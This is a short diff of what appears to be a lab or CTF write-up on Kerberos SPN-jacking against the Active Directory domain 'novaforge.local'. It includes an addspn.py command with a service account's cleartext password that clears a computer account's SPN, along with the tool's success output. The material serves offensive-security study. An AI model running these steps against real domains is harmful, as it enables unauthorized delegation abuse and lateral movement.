@@ -1176,7 +1176,7 @@ svc_it_admin  Person       Constrained w/ Protocol Transition  WSMAN/STORAGE    
 
 https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking
 
-Whats also helpful is i can follow the exact steps in this website, since i have t
+Whats also helpful is i can follow the exact steps in this website, since i have an indentical scenario
 
 ```python
 python3 addspn.py --clear -t 'STORAGE$' -u 'novaforge.local\svc_it_admin' -p 'Password123!' "dc.novaforge.local" 
@@ -1202,3 +1202,4 @@ DN: CN=STORAGE,CN=Computers,DC=novaforge,DC=local - STATUS: Read - READ TIME: 20
 [+] SPN Modified successfully
 ```
 
+So first ill remove the SPN
